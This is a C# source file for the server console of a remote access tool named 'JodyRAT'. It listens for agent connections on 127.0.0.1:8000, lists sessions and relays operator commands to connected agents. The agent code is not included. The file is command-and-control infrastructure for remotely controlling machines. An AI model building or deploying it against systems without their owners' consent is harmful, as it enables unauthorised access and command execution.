using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;
using System.Text;
using System.IO;

/// <summary> Holds global configuration constants for the application </summary>
class ServerConstants{
    public const string SERVER_HOST = "127.0.0.1";
    public const int SERVER_PORT = 8000;
    public const string PROMPT = "JodyRAT> ";
    public const string EOF = "<<<<EOF>>>>";
}

/// <summary> The main Server class. Responsible for creating the main listener as well as a ClientHandler for each agent</summary>
class Server {

    private static List<ClientHandler> ClientList;    
    private static string Prompt = ServerConstants.PROMPT;

    static void Main(string[] args){
        ClientList = new List<ClientHandler>();         
        Server.Log(String.Format("Initializing server on {0}:{1}", ServerConstants.SERVER_HOST, ServerConstants.SERVER_PORT));
        TcpListener Sock = new TcpListener(IPAddress.Parse(ServerConstants.SERVER_HOST), ServerConstants.SERVER_PORT);
        ServerListener Listener = new ServerListener();
        Listener.Start(Sock);
        Thread.Sleep(1000);

        // Launch interactive command interface for user
        bool KeepGoing = true;
        int CurrentSession = -1;        
        while(KeepGoing){
            MakePrompt();
            string UserInput = Console.ReadLine();
            string[] UserInputTokens = UserInput.Split(' ');            
            switch(UserInputTokens[0].ToLower()){
                case "quit":
                    if(CurrentSession == -1){  // At main menu: Send quit to all agents and exit server
                        Log("Quitting all Sessions");
                        KeepGoing = false;
                        foreach(ClientHandler client in ClientList){
                            client.SendClientCommand("quit");
                            client.Stop();
                        }
                        Thread.Sleep(1000); // Ensure each ClientHandler thread has a chance to send the message before program exits.
                    }else{                  // In session menu: Send quit to selected session, remove from list, and reset to main menu.
                        Log("Quitting Session " + CurrentSession);
                        ClientList[CurrentSession].SendClientCommand("quit");
                        ClientList[CurrentSession].Stop();
                        ClientList.RemoveAt(CurrentSession);
                        CurrentSession = -1;
                        Prompt = ServerConstants.PROMPT;
                    }
                break;
                case "back":
                    CurrentSession = -1;
                    Prompt = ServerConstants.PROMPT;
                break;
                case "list":
                    for(int ctr = 0; ctr < ClientList.Count; ctr++){
                        Console.WriteLine(ctr + ") " + ClientList[ctr].Identify());
                    }
                break;
                case "enter":
                    try{
                        string SessionID = UserInputTokens[1];
                        int SpecifiedSession = Int32.Parse(SessionID);
                        if(ClientList.Count > SpecifiedSession){
                            CurrentSession = SpecifiedSession;
                            Console.WriteLine("Entering session " + CurrentSession);                            
                            Prompt = String.Format("{0}({1}) ",ServerConstants.PROMPT, CurrentSession);
                        }
                    }catch(Exception){
                        CurrentSession = -1;
                        Prompt = ServerConstants.PROMPT;
                        LogError("Error in entering specified session");
                    }
                break;
                case "cmd": case "info":
                    if(CurrentSession == -1){
                        LogError("This Command can only be used after a session has been selected");
                    }else{
                        try{
                            ClientList[CurrentSession].SendClientCommand(UserInput);
                            Thread.Sleep(100);
                        }catch(ArgumentOutOfRangeException){
                            LogError("The specified session does not exist");
                        }catch(Exception){
                            LogError("Error in sending command to selected session");
                        }
                    }
                break;
                case "":
                break;
                default:
                    LogError("Unknown command: " + UserInput);
                break;
            }
        }
        Listener.Stop();
        foreach (ClientHandler Client in ClientList){
            Client.Stop();
        }

    }

    private static void MakePrompt(){
        Console.ForegroundColor = ConsoleColor.Green;
        Console.Write(Prompt);
        Console.ResetColor();
    }

    public static void AddClient(ClientHandler s){
        ClientList.Add(s);
    }

    public static void ClientResponse(string s){
        Console.WriteLine();
        Console.WriteLine(s);        
    }

    public static void Log(string l){
        Console.WriteLine();
        Console.WriteLine(l);
    }

    public static void LogError(string l){
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("[!] {0}",l);
        Console.ResetColor();        
    }

}

/// <summary>The Server creates one instance of this class in order to listen for connections from Agents when they come online. </summary>
/// <remarks>When an Agent comes online, a ClientHandler is created for it and the main Server is notified to add the new Agent to its list.</remarks>
class ServerListener{

    private TcpListener Sock;
    private Thread LThread;
    private bool Active;

    public void Start(TcpListener s){
        Sock = s;        
        Active = true;
        LThread = new Thread(ListenerThread);
        LThread.Start();
    }

    public void Stop(){
        Active = false;
        Sock.Stop();
    }

    private void ListenerThread(){
        Server.Log("Starting Server Listener Thread");
        while(true){
            if(!Active){
                return;
            }
            try{
                Sock.Start();
                TcpClient Client = Sock.AcceptTcpClient();
                ClientHandler Handler = new ClientHandler();
                Handler.Start(Client);
                Server.AddClient(Handler);
            }catch(SocketException e){
                if(e.ErrorCode == (int)SocketError.Interrupted && !Active){
                    //  Do nothing. This is the exception generated when the blocking socket operation is cancelled when we shut down the thread.
                }else{
                    Server.LogError(String.Format("Socket Exception!\n{0}:{1}", e.ErrorCode,e.Message));
                }
            }            
        }
    }
}

/// <summary>The ClientHandler is responsible for interacting with a single Agent, passing commands and receiving responses, which are passed back to the main Server</summary>
class ClientHandler {
    
    private TcpClient Client;
    private Queue<string> NextCmds;
    private bool Active;
    private string Identity;

    public void Start(TcpClient c){
        Server.Log("Starting ClientHandler Thread");        
        Active = true;
        Identity = "";
        Client = c;
        NextCmds = new Queue<string>();
        Thread CThread = new Thread(HandleClient);
        CThread.Start();
    }

    public void Stop(){
        Thread.Sleep(1000);     // Brief pause to allow any remaining commands to be sent before shutting down
        Active = false;
    }

    public void SendClientCommand(string cmd){
        NextCmds.Enqueue(cmd);
    }

    public string Identify(){
        if (Identity == ""){
            NetworkStream Stream = Client.GetStream();
            StreamReader Reader = new StreamReader(Stream);
            StreamWriter Writer = new StreamWriter(Stream);
            Writer.WriteLine("identify");
            Writer.Flush();
            Identity = Reader.ReadLine();
        }
        return Identity;        
    }

    private void HandleClient(){
        while(true){
            if(!Active){
                return;
            }
            if(NextCmds.Count > 0){
                // Send command
                NetworkStream Stream = Client.GetStream();
                StreamReader Reader = new StreamReader(Stream);
                StreamWriter Writer = new StreamWriter(Stream);
                string NextCmd = NextCmds.Dequeue();
                Writer.WriteLine(NextCmd);
                Writer.Flush();

                // Receive response
                string line;
                string Result = "";
                while((line = Reader.ReadLine()) != ServerConstants.EOF){
                    Result += line + "\n";  
                }
                Server.ClientResponse(Result);
            }
            Thread.Sleep(5);
        }
    }
}